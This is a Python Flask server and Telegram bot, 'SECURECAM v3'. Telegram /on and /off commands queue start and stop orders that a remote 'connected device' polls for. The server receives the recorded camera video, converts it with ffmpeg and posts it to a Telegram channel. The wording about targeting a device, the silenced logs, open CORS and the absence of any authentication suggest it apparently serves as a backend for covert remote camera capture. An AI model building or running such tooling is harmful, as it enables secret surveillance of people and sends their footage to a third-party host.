"""
SECURECAM v3 - Clean, Fast Camera Control Bot
Commands: /on (start recording), /off (stop + upload MP4)
No username needed - targets connected device directly
"""

import os
import json
import uuid
import time
import shutil
import subprocess
import threading
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify
from flask_cors import CORS

# ================================================================
# CONFIGURATION
# ================================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
CHANNEL_ID = os.environ.get("CHANNEL_ID", "@YOUR_CHANNEL")
PORT = int(os.environ.get("PORT", "8080"))

# ================================================================
# FLASK APP SETUP
# ================================================================
app = Flask(__name__)
CORS(app)

# Silence request logs
import logging
logging.getLogger('werkzeug').setLevel(logging.ERROR)

# ================================================================
# STORAGE & STATE
# ================================================================
device_command = {"pending": None}
device_lock = threading.Lock()

uploads = {}
upload_lock = threading.Lock()

progress_messages = {}  # {upload_id: {"chat_id": X, "message_id": Y, "last_update": timestamp}}

worker_pool = ThreadPoolExecutor(max_workers=2)

UPLOAD_DIR = '/tmp/securecam_uploads'
MP4_DIR = '/tmp/securecam_mp4'
os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(MP4_DIR, exist_ok=True)

# ================================================================
# TELEGRAM API HELPERS
# ================================================================
def tg_send(chat_id, text, parse_mode="HTML"):
    """Send message to Telegram, return message_id."""
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": text,
                "parse_mode": parse_mode,
                "disable_web_page_preview": True
            },
            timeout=15
        )
        if r.status_code == 200:
            return r.json().get("result", {}).get("message_id")
        else:
            print(f"⚠️ tg_send failed: {r.status_code} {r.text[:200]}")
    except Exception as e:
        print(f"⚠️ tg_send error: {e}")
    return None

def tg_edit(chat_id, message_id, text, parse_mode="HTML"):
    """Edit existing Telegram message with flood wait protection."""
    try:
        # Check if we edited recently (minimum 2 seconds between edits)
        info = progress_messages.get(str(message_id))
        if info and info.get("last_update"):
            elapsed = time.time() - info["last_update"]
            if elapsed < 2:
                return False  # Skip edit to avoid flood
        
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
            json={
                "chat_id": chat_id,
                "message_id": message_id,
                "text": text,
                "parse_mode": parse_mode,
                "disable_web_page_preview": True
            },
            timeout=15
        )
        
        if r.status_code == 200:
            # Update last_edit timestamp
            if info:
                info["last_update"] = time.time()
            return True
        elif r.status_code == 429:
            # Flood wait - extract retry_after
            retry_after = r.json().get("parameters", {}).get("retry_after", 5)
            print(f"⚠️ Flood wait: {retry_after}s")
            time.sleep(retry_after)
            return False
        elif "not modified" in r.text.lower():
            return True  # Not an error
        else:
            print(f"⚠️ tg_edit failed: {r.status_code} {r.text[:200]}")
    except Exception as e:
        print(f"⚠️ tg_edit error: {e}")
    return False

def tg_send_video(chat_id, video_path, caption):
    """Upload video to Telegram."""
    try:
        filename = os.path.basename(video_path)
        
        with open(video_path, 'rb') as vf:
            files = {"video": (filename, vf, "video/mp4")}
            data = {
                "chat_id": chat_id,
                "caption": caption,
                "parse_mode": "HTML",
                "supports_streaming": "True"
            }
            
            resp = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                files=files,
                data=data,
                timeout=300
            )
            
            if resp.status_code == 200:
                return True
            else:
                print(f"❌ Video upload failed: {resp.status_code} {resp.text[:200]}")
                return False
    except Exception as e:
        print(f"❌ Video upload error: {e}")
        return False

def fmt_size(b):
    """Format bytes to human readable size."""
    if b == 0:
        return "0 B"
    units = ['B', 'KB', 'MB', 'GB']
    k = 1024
    i = 0
    s = float(b)
    while s >= k and i < len(units) - 1:
        s /= k
        i += 1
    return f"{s:.1f} {units[i]}"

# ================================================================
# API ENDPOINTS
# ================================================================
@app.route('/api/cmd/get', methods=['GET'])
def cmd_get():
    """App polls this every 1 second for pending commands."""
    with device_lock:
        cmd = device_command.get("pending")
        if cmd:
            device_command["pending"] = None  # Consume command
            return jsonify({"action": cmd, "timestamp": time.time()}), 200
    return jsonify({"action": "none"}), 200

@app.route('/api/video/upload', methods=['POST'])
def video_upload():
    """Receive video from app, convert to MP4, upload to Telegram."""
    video_file = request.files.get('video')
    if not video_file:
        return jsonify({"error": "No video file"}), 400

    upload_id = uuid.uuid4().hex[:10]
    timestamp = datetime.now().strftime("%d/%m/%Y %I:%M %p")

    # Save raw file
    ext = video_file.filename.rsplit('.', 1)[-1].lower() if '.' in video_file.filename else 'webm'
    raw_path = os.path.join(UPLOAD_DIR, f"{upload_id}_raw.{ext}")
    video_file.save(raw_path)
    raw_size = os.path.getsize(raw_path)

    print(f"📹 Upload received: {upload_id} ({fmt_size(raw_size)})")

    # Process in background
    worker_pool.submit(process_and_upload, upload_id, raw_path, raw_size, timestamp)

    return jsonify({"status": "ok", "upload_id": upload_id}), 200

# ================================================================
# BACKGROUND PROCESSING
# ================================================================
def process_and_upload(upload_id, raw_path, raw_size, timestamp):
    """Convert to MP4 → upload to Telegram → update progress."""
    chat_id = CHANNEL_ID

    # Step 1: Send initial progress message
    progress_text = (
        f"📹 **NEW RECORDING RECEIVED**\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🆔 ID: `{upload_id}`\n"
        f"📦 Raw Size: {fmt_size(raw_size)}\n"
        f"🕐 Time: {timestamp}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"⏳ Preparing...\n"
        f"[░░░░░░░░░░] 0%"
    )
    msg_id = tg_send(chat_id, progress_text)
    
    if msg_id:
        progress_messages[upload_id] = {
            "chat_id": chat_id,
            "message_id": msg_id,
            "last_update": time.time()
        }

    # Step 2: Convert to MP4 (if needed)
    mp4_path = os.path.join(MP4_DIR, f"{upload_id}.mp4")
    
    ext = raw_path.rsplit('.', 1)[-1].lower() if '.' in raw_path else ''
    
    if ext == 'mp4':
        # Already MP4 - just copy
        try:
            shutil.copy2(raw_path, mp4_path)
            update_progress(upload_id, 100, "Already MP4 ✅")
        except Exception as e:
            print(f"⚠️ Copy failed: {e}")
            update_progress(upload_id, -1, f"❌ Copy failed: {str(e)[:150]}")
            cleanup_upload(upload_id, raw_path, None)
            return
    else:
        # Convert WebM/other → MP4
        ffmpeg = find_ffmpeg()
        if not ffmpeg:
            update_progress(upload_id, -1, "❌ FFmpeg not installed!")
            cleanup_upload(upload_id, raw_path, None)
            return

        cmd = [
            ffmpeg, '-y',
            '-i', raw_path,
            '-vf', 'scale=w=trunc(iw/2)*2:h=trunc(ih/2)*2,format=yuv420p',
            '-c:v', 'libx264', '-preset', 'fast', '-crf', '22',
            '-pix_fmt', 'yuv420p',
            '-c:a', 'aac', '-b:a', '128k',
            '-movflags', '+faststart',
            mp4_path
        ]

        update_progress(upload_id, 10, "Converting to MP4...")

        try:
            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=600,  # 10 minute timeout
                text=True
            )

            if result.returncode != 0:
                stderr = result.stderr[:500] if result.stderr else "Unknown error"
                update_progress(upload_id, -1, f"❌ Conversion failed:\n{stderr[:200]}")
                cleanup_upload(upload_id, raw_path, None)
                return

            if not os.path.exists(mp4_path) or os.path.getsize(mp4_path) == 0:
                update_progress(upload_id, -1, "❌ Output file is empty!")
                cleanup_upload(upload_id, raw_path, None)
                return

        except subprocess.TimeoutExpired:
            update_progress(upload_id, -1, "❌ Conversion timeout (10 min)")
            cleanup_upload(upload_id, raw_path, None)
            return
        except Exception as e:
            update_progress(upload_id, -1, f"❌ Conversion error: {str(e)[:200]}")
            cleanup_upload(upload_id, raw_path, None)
            return

    # Ensure audio track exists
    ensure_audio(mp4_path)

    mp4_size = os.path.getsize(mp4_path)
    update_progress(upload_id, 90, f"MP4 Ready ✅ ({fmt_size(mp4_size)})\n📤 Uploading...")

    # Step 3: Upload to Telegram
    duration = get_duration(mp4_path)
    width, height = get_resolution(mp4_path)

    caption = (
        f"✅ **RECORDING — MP4**\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🆔 ID: `{upload_id}`\n"
        f"🎬 Video: MP4 (Direct Play ✅)\n"
        f"📦 Size: {fmt_size(mp4_size)}\n"
        f"⏱ Duration: {fmt_duration(duration)}\n"
        f"📐 Resolution: {width}×{height}\n"
        f"🕐 Time: {timestamp}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"✅ **UPLOAD COMPLETE**"
    )

    success = tg_send_video(chat_id, mp4_path, caption)

    if success:
        update_progress(upload_id, 100, "✅ **DONE!**\n🎥 MP4 uploaded to channel!")
    else:
        update_progress(upload_id, -1, "❌ Upload to Telegram failed!")

    # Cleanup
    cleanup_upload(upload_id, raw_path, mp4_path)

def update_progress(upload_id, percent, status_text):
    """Update progress message in Telegram."""
    info = progress_messages.get(upload_id)
    if not info:
        return

    chat_id = info.get("chat_id")
    msg_id = info.get("message_id")
    
    if not chat_id or not msg_id:
        return

    # Build progress bar
    if percent == -1:
        bar = "❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌"
        text = (
            f"📹 **RECORDING** — `{upload_id}`\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"{bar}\n"
            f"{status_text}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🕐 {datetime.now().strftime('%I:%M:%S %p')}"
        )
    elif percent >= 100:
        bar = "✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅"
        text = (
            f"📹 **RECORDING** — `{upload_id}`\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"{bar}\n"
            f"{status_text}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🕐 {datetime.now().strftime('%I:%M:%S %p')}"
        )
    else:
        filled = int(percent / 10)
        empty = 10 - filled
        bar = "█" * filled + "░" * empty
        text = (
            f"📹 **RECORDING** — `{upload_id}`\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"[{bar}] {percent}%\n"
            f"📌 {status_text}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🕐 {datetime.now().strftime('%I:%M:%S %p')}"
        )

    tg_edit(chat_id, msg_id, text)

def cleanup_upload(upload_id, raw_path, mp4_path):
    """Delete temp files after processing."""
    for path in [raw_path, mp4_path]:
        try:
            if path and os.path.exists(path):
                os.remove(path)
        except Exception as e:
            print(f"⚠️ Cleanup error for {path}: {e}")
    
    progress_messages.pop(upload_id, None)

# ================================================================
# FFMPEG HELPERS
# ================================================================
def find_ffmpeg():
    """Find FFmpeg executable."""
    for path in ['ffmpeg', '/usr/bin/ffmpeg', '/usr/local/bin/ffmpeg']:
        if shutil.which(path) or os.path.exists(path):
            return path
    return None

def get_duration(filepath):
    """Get video duration in seconds."""
    try:
        ffprobe = shutil.which('ffprobe') or 'ffprobe'
        result = subprocess.run(
            [ffprobe, '-v', 'error', '-show_entries', 'format=duration',
             '-of', 'default=noprint_wrappers=1:nokey=1', filepath],
            capture_output=True,
            text=True,
            timeout=15
        )
        return float(result.stdout.strip())
    except Exception:
        return 0

def get_resolution(filepath):
    """Get video width and height."""
    try:
        ffprobe = shutil.which('ffprobe') or 'ffprobe'
        result = subprocess.run(
            [ffprobe, '-v', 'error', '-select_streams', 'v:0',
             '-show_entries', 'stream=width,height', '-of', 'csv=p=0', filepath],
            capture_output=True,
            text=True,
            timeout=15
        )
        parts = result.stdout.strip().split(',')
        if len(parts) == 2:
            return int(parts[0]), int(parts[1])
    except Exception:
        pass
    return 0, 0

def fmt_duration(secs):
    """Format seconds to readable duration."""
    if secs <= 0:
        return "0s"
    m, s = divmod(int(secs), 60)
    h, m = divmod(m, 60)
    if h > 0:
        return f"{h}h {m}m {s}s"
    if m > 0:
        return f"{m}m {s}s"
    return f"{s}s"

def ensure_audio(mp4_path):
    """Add silent audio track if missing (Telegram needs audio for proper playback)."""
    try:
        ffprobe = shutil.which('ffprobe') or 'ffprobe'
        result = subprocess.run(
            [ffprobe, '-v', 'error', '-select_streams', 'a:0',
             '-show_entries', 'stream=codec_type', '-of', 'csv=p=0', mp4_path],
            capture_output=True,
            text=True,
            timeout=15
        )
        
        if 'audio' in (result.stdout or '').lower():
            return  # Already has audio

        ffmpeg = find_ffmpeg()
        if not ffmpeg:
            return

        base, _ = os.path.splitext(mp4_path)
        tmp_path = base + '_audio.mp4'

        cmd = [
            ffmpeg, '-y', '-i', mp4_path,
            '-f', 'lavfi', '-i', 'anullsrc=channel_layout=stereo:sample_rate=48000',
            '-map', '0:v:0', '-map', '1:a:0',
            '-c:v', 'copy', '-c:a', 'aac', '-b:a', '128k',
            '-shortest', '-movflags', '+faststart',
            tmp_path
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        
        if result.returncode == 0 and os.path.exists(tmp_path) and os.path.getsize(tmp_path) > 0:
            os.replace(tmp_path, mp4_path)
            print(f"✅ Silent audio track added")
        else:
            print(f"⚠️ Audio add failed: {result.stderr[:200]}")
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
    except Exception as e:
        print(f"⚠️ ensure_audio error: {e}")

# ================================================================
# TELEGRAM BOT LISTENER
# ================================================================
def bot_listener():
    """Listen for Telegram commands: /on and /off."""
    offset = 0
    print("🤖 Bot Listener: Started — commands: /on /off")

    while True:
        try:
            if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or not BOT_TOKEN:
                time.sleep(10)
                continue

            r = requests.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                params={"offset": offset, "timeout": 10},
                timeout=15
            )

            if r.status_code == 200:
                data = r.json()
                for update in data.get("result", []):
                    offset = update["update_id"] + 1
                    msg = update.get("message")
                    if not msg:
                        continue

                    chat_id = msg["chat"]["id"]
                    text = (msg.get("text") or "").strip().lower()

                    if text == "/start":
                        tg_send(chat_id,
                            "🎥 **SECURECAM v3**\n"
                            "━━━━━━━━━━━━━━━━━━\n"
                            "🟢 `/on` — Camera ON + Recording Start\n"
                            "🔴 `/off` — Stop + Upload MP4\n"
                            "━━━━━━━━━━━━━━━━━━\n"
                            "⚡ Commands are INSTANT!\n"
                            "📹 Progress shown here live."
                        )
                        continue

                    if text == "/on":
                        with device_lock:
                            device_command["pending"] = "start"
                        
                        tg_send(chat_id,
                            "🟢 **CAMERA ON + RECORDING**\n"
                            "━━━━━━━━━━━━━━━━━━\n"
                            "⚡ Command sent — device will respond within 1 second!\n"
                            "📹 Camera is turning ON and recording will start."
                        )
                        continue

                    if text == "/off":
                        with device_lock:
                            device_command["pending"] = "stop"
                        
                        tg_send(chat_id,
                            "🔴 **STOPPING...**\n"
                            "━━━━━━━━━━━━━━━━━━\n"
                            "⏹️ Recording will stop.\n"
                            "📤 Video will be uploaded as MP4 shortly.\n"
                            "📊 Progress will be shown below."
                        )
                        continue

                    # Unknown command
                    tg_send(chat_id,
                        "⚠️ Unknown command!\n\n"
                        "Use `/on` to start camera + recording\n"
                        "Use `/off` to stop + upload MP4"
                    )

            else:
                time.sleep(3)

        except Exception as e:
            print(f"⚠️ Bot error: {e}")
            time.sleep(2)

# Start bot listener
threading.Thread(target=bot_listener, daemon=True).start()

# ================================================================
# HEALTH CHECK & UTILITIES
# ================================================================
@app.route('/api/status', methods=['GET'])
def status():
    """Health check endpoint."""
    return jsonify({
        "status": "online",
        "version": "3.0",
        "bot_active": BOT_TOKEN != "YOUR_BOT_TOKEN_HERE",
        "ffmpeg": bool(find_ffmpeg()),
        "pending_command": device_command.get("pending")
    }), 200

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    """Keep server alive."""
    return jsonify({"ok": True}), 200

# ================================================================
# RUN SERVER
# ================================================================
if __name__ == '__main__':
    print("=" * 50)
    print("🎥 SECURECAM v3 — Clean & Fast")
    print("=" * 50)
    print(f"🤖 Bot: {'✅' if BOT_TOKEN != 'YOUR_BOT_TOKEN_HERE' else '❌ Set BOT_TOKEN'}")
    print(f"📡 Channel: {CHANNEL_ID}")
    print(f"🌐 Port: {PORT}")
    print(f"🎬 FFmpeg: {'✅' if find_ffmpeg() else '❌'}")
    print("Commands: /on /off")
    print("=" * 50)
    app.run(host='0.0.0.0', port=PORT)
